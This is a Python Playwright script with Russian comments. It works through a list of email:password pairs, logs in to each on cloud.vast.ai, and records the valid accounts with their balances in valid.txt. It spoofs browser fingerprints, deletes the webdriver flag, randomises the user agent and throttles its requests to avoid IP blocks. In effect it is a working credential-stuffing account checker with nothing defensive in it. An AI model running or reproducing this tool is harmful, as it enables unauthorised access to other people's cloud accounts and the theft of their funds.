from playwright.sync_api import sync_playwright
import time
from datetime import datetime
import random

def check_account(email, password):
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=False, # ИЗМЕНИТЬ НА True ЧТОБЫ СКРЫТЬ БРАУЗЕР
            args=[
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
                "--start-maximized",
                "--no-sandbox",
                f"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 115)}.0.0.0 Safari/537.36",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-extensions"
            ],
            executable_path="C:/Program Files/Google/Chrome/Application/chrome.exe"
        )

        context = browser.new_context(
            viewport=None,
            locale='ru-RU',
            timezone_id='Europe/Moscow',
            geolocation={'latitude': 55.7558, 'longitude': 37.6173},
            permissions=['geolocation'],
            color_scheme='light',
            ignore_https_errors=True,
            java_script_enabled=True,
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
        )

        page = context.new_page()
        page.add_init_script("""
            delete Object.getPrototypeOf(navigator).webdriver;
            window.navigator.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'languages', {
                get: () => ['ru-RU', 'ru']
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3]
            });
        """)
        
        try:
            page.goto("https://cloud.vast.ai/", timeout=70000)
            print(f"{datetime.now().strftime('%H:%M:%S')} ✓ Страница загружена")

            login_button = page.wait_for_selector('div.css-1w6bddr', timeout=5000)
            login_button.click()

            page.click('text=Sign in')

            email_field = page.wait_for_selector('input[name="username"]', timeout=5000)
            page.fill('input[name="username"]', email)
            print(f"{datetime.now().strftime('%H:%M:%S')} ✓ Email введен")

            password_field = page.wait_for_selector('input[name="password"]', timeout=5000)
            page.fill('input[name="password"]', password)
            print(f"{datetime.now().strftime('%H:%M:%S')} ✓ Пароль введен")

            continue_button = page.wait_for_selector('button[data-aid="auth-submitLogin"]', timeout=10000)
            continue_button.click()

            page.wait_for_load_state('load')

            #balance_text = page.inner_text('div.css-t4njyh span.css-1epcapw')
            balance_text = None
            try:
                balance_text = page.inner_text('div.css-t4njyh span.css-1epcapw', timeout=2000)
                print(f"[VALID] {email}:{password} | {balance_text}")
                with open("valid.txt", "a") as f:
                    f.write(f"{email}:{password} | {balance_text}\n")
            except:
                pass
            if not balance_text:
                try:
                    balance_text = page.inner_text('div.css-t4njyh span.css-1bu46vj', timeout=2000)
                    print(f"[VALID] {email}:{password} | {balance_text}")
                    with open("valid.txt", "a") as f:
                        f.write(f"{email}:{password} | {balance_text}\n")
                except:
                    print(f"[INVALID] {email}:{password} ")
                    with open("invalid.txt", "a") as f:
                        f.write(f"{email}:{password}\n")

                
                
            
            time.sleep(4) # ПАУЗА, ЧТОБЫ НЕ БЛОКАЛО IP (МОЖНО УМЕНЬШИТЬ)
                

        except Exception as e:
            print(f"⚠ Критическая ошибка: {str(e)}")
            page.screenshot(path=f"error_{int(time.time())}.png")
        finally:
            time.sleep(3)
            context.close()
            browser.close()

def load_accounts(filename):
    with open(filename, "r") as f:
        lines = f.readlines()
    accounts = []
    for line in lines:
        if ':' in line:
            email, password = line.strip().split(':', 1)
            accounts.append((email, password))
    return accounts

def main():
    accounts = load_accounts("accounts.txt")
    for email, password in accounts:
        check_account(email, password)

if __name__ == "__main__":
    main()